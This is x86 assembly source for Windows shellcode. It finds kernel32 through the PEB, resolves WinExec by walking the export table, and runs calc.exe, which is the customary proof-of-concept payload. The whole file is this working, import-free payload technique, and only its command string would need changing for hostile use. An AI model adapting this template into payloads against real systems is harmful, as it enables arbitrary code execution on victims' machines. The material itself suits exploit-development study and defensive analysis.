.386

.model flat, stdcall

.code
start:
		push eax
		push ebx
		push ecx
		push edx
		push esi
		push edi
		push ebp
		push ebp
		mov  ebp,esp
		sub  esp,18
		xor  esi,esi
		push esi

		xor  eax,eax
		mov  ax,6365h
		shl  eax,8h
		mov  al,78h
		push eax
		push 456E6957h
		mov  dword ptr ss:[ebp-4h],esp
		
		xor  esi,esi

		;================================
		;Find Kernel32 Base
		;================================
		ASSUME fs:NOTHING
		mov ebx,dword ptr fs:[esi+30h]
		ASSUME fs:ERROR
		mov ebx,dword ptr ds:[ebx+0Ch]
		mov ebx,dword ptr ds:[ebx+14h]
		mov ebx,dword ptr ds:[ebx]
		mov ebx,dword ptr ds:[ebx]
		mov ebx,dword ptr ds:[ebx+10h]
		mov dword ptr ss:[ebp-08h],ebx
		mov eax,dword ptr ds:[ebx+3Ch]
		add eax,ebx
		mov eax,dword ptr ds:[eax+78h]
		add eax,ebx
		mov ecx,dword ptr ds:[eax+24h]
		add ecx,ebx
		mov dword ptr ss:[ebp-0Ch],ecx
		mov edi,dword ptr ds:[eax+20h]
		add edi,ebx
		mov dword ptr ss:[ebp-10h],edi
		mov edx,dword ptr ds:[eax+1Ch]
		add edx,ebx
		mov dword ptr ss:[ebp-14h],edx
		mov edx,dword ptr ds:[eax+14h]
		xor eax,eax

jb_01:
		mov edi,dword ptr ss:[ebp-10h]
		mov esi,dword ptr ss:[ebp-04h]
		xor ecx,ecx
		cld 
		mov edi,dword ptr ds:[edi+eax*4h]
		add edi,ebx
		add cx,08h
		repe cmpsb byte ptr ds:[esi],byte ptr es:[edi]
		je je_01

		inc eax
		cmp eax,edx
		jb jb_01

		add esp,26
		jmp cleanup

je_01:
		mov ecx,dword ptr ss:[ebp-0Ch]
		mov edx,dword ptr ss:[ebp-14h]
		mov ax,word ptr ds:[ecx+eax*2]
		mov eax,dword ptr ds:[edx+eax*4]
		add eax,ebx
		xor edx,edx
		push edx
		push 6578652Eh
		push 636C6163h
		push 5C32336Dh
		push 65747379h
		push 535C7377h
		push 6F646E69h
		push 575C3A43h
		mov esi,esp
		push 0Ah
		push esi
		call eax
		add esp,46h
cleanup:
		pop ebp
		pop edi
		pop esi
		pop edx
		pop ecx
		pop ebx
		pop eax
END start